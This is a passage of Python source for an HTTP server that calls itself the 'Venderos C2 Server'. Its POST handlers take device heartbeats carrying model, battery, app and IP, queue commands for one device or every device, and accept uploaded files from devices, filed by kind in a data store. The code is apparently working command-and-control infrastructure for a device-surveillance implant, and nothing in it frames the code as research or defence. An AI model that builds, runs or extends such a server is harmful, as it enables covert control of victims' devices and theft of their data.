                self.send_resp(HTTPStatus.INTERNAL_SERVER_ERROR, b"read error\n")
            return

        self.send_resp(HTTPStatus.NOT_FOUND, b"not found\n")

    def do_POST(self):
        parsed = urlparse(self.path)
        path = parsed.path

        if path == "/poll":
            if not self.check_auth():
                self.send_resp(HTTPStatus.UNAUTHORIZED, b'{"error":"unauthorized"}\n', "application/json")
                return

            dev_id = self.headers.get("X-Device-Id", "").strip()
            if not dev_id:
                self.send_resp(HTTPStatus.BAD_REQUEST, b'{"error":"missing device id"}\n', "application/json")
                return

            model = self.headers.get("X-Device-Model", "").strip()
            battery = self.headers.get("X-Device-Battery", "").strip()
            app = self.headers.get("X-Device-App", "").strip()
            ip = self.get_client_ip()

            cmds = device_mgr.update_heartbeat(dev_id, model, battery, app, ip)
            resp = json.dumps({"status": "ok", "commands": cmds})
            self.send_resp(HTTPStatus.OK, resp.encode("utf-8"), "application/json")
            return

        if path == "/api/trigger":
            if not self.check_auth():
                self.send_resp(HTTPStatus.UNAUTHORIZED, b'{"error":"unauthorized"}\n', "application/json")
                return

            try:
                length = int(self.headers.get("Content-Length", 0))
                raw_body = self.rfile.read(length).decode("utf-8", errors="replace")
                data = json.loads(raw_body) if raw_body.startswith("{") else dict(parse_qs(raw_body))
            except Exception:
                data = {}

            target = data.get("device_id") or data.get("target") or "all"
            if isinstance(target, list):
                target = target[0]
            cmd = data.get("cmd") or data.get("action") or "all"
            if isinstance(cmd, list):
                cmd = cmd[0]

            targets = device_mgr.queue_command(target, cmd)
            print(f"[!] GUI Trigger queued: cmd='{cmd}' target='{target}' matched={targets}", flush=True)

            resp = json.dumps({"status": "ok", "cmd": cmd, "targets": targets})
            self.send_resp(HTTPStatus.OK, resp.encode("utf-8"), "application/json")
            return

        if path == "/u":
            if not self.check_auth():
                self.send_resp(HTTPStatus.UNAUTHORIZED, b"unauthorized\n")
                return

            try:
                content_length = int(self.headers.get("Content-Length", 0))
            except ValueError:
                self.send_resp(HTTPStatus.BAD_REQUEST, b"bad content length\n")
                return

            if content_length <= 0 or content_length > MAX_BODY_SIZE:
                self.send_resp(HTTPStatus.REQUEST_ENTITY_TOO_LARGE, b"payload too large or empty\n")
                return

            content_type = self.headers.get("Content-Type", "")
            if not content_type.startswith("multipart/form-data"):
                self.send_resp(HTTPStatus.BAD_REQUEST, b"multipart required\n")
                return

            body = self.rfile.read(content_length)
            if len(body) != content_length:
                self.send_resp(HTTPStatus.BAD_REQUEST, b"incomplete read\n")
                return

            try:
                ct_clean = content_type
                if "boundary=" in ct_clean and 'boundary="' not in ct_clean:
                    parts = ct_clean.split("boundary=", 1)
                    b_val = parts[1].strip()
                    ct_clean = f'{parts[0]}boundary="{b_val}"'
                header_bytes = f"Content-Type: {ct_clean}\r\n\r\n".encode("latin-1")
                msg = BytesParser(policy=default).parsebytes(header_bytes + body)
            except Exception:
                self.send_resp(HTTPStatus.BAD_REQUEST, b"parse error\n")
                return

            kind = None
            filename = None
            file_bytes = None
            body_dev = None

            for part in msg.iter_parts():
                name = part.get_param("name", header="content-disposition")
                if name == "kind":
                    payload = part.get_payload(decode=True)
                    if isinstance(payload, bytes):
                        kind = payload.decode("utf-8", errors="replace").strip()
                    elif isinstance(payload, str):
                        kind = payload.strip()
                elif name == "device_id":
                    payload = part.get_payload(decode=True)
                    if isinstance(payload, bytes):
                        body_dev = payload.decode("utf-8", errors="replace").strip()
                    elif isinstance(payload, str):
                        body_dev = payload.strip()
                elif name == "f":
                    filename = part.get_filename() or "upload.bin"
                    file_bytes = part.get_payload(decode=True)

            if not kind or file_bytes is None:
                self.send_resp(HTTPStatus.BAD_REQUEST, b"missing kind or f\n")
                return

            dev_id = self.headers.get("X-Device-Id", "").strip() or body_dev or "unknown"
            safe_dev = re.sub(r"[^a-zA-Z0-9_\-]", "", dev_id) or "unknown"
            safe_kind = re.sub(r"[^a-zA-Z0-9_\-]", "", kind) or "misc"
            safe_name = re.sub(r"[^a-zA-Z0-9_.\-]", "_", os.path.basename(filename)) or "upload.bin"

            now = datetime.now(timezone.utc)
            date_str = now.strftime("%Y-%m-%d")
            epoch_str = str(int(now.timestamp()))
            target_dir = os.path.join(DATA_DIR, safe_kind, date_str)
            os.makedirs(target_dir, exist_ok=True)

            final_filename = f"{epoch_str}_{safe_dev}_{safe_name}"
            final_path = os.path.join(target_dir, final_filename)
            part_path = final_path + ".part"

            with open(part_path, "wb") as f_out:
                f_out.write(file_bytes)
            os.replace(part_path, final_path)

            size = len(file_bytes)
            rel_path = os.path.relpath(final_path, BASE_DIR)
            index_line = f"{now.isoformat()}\t{safe_dev}\t{safe_kind}\t{size}\t{rel_path}\n"
            index_file = os.path.join(DATA_DIR, "index.log")
            with open(index_file, "a", encoding="utf-8") as f_idx:
                f_idx.write(index_line)

            print(f"[+] {now.strftime('%H:%M:%S')} Received {safe_kind} from {safe_dev}: {rel_path} ({size} bytes)", flush=True)

            self.send_resp(HTTPStatus.OK, b"ok\n")
            return

        self.send_resp(HTTPStatus.NOT_FOUND, b"not found\n")

def run():
    print(f"[*] Venderos C2 Server listening on 127.0.0.1:{PORT} (Press Ctrl+C to stop)", flush=True)
    server = ThreadingHTTPServer(("127.0.0.1", PORT), ReceiverHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    finally:
        server.server_close()

if __name__ == "__main__":
    run()
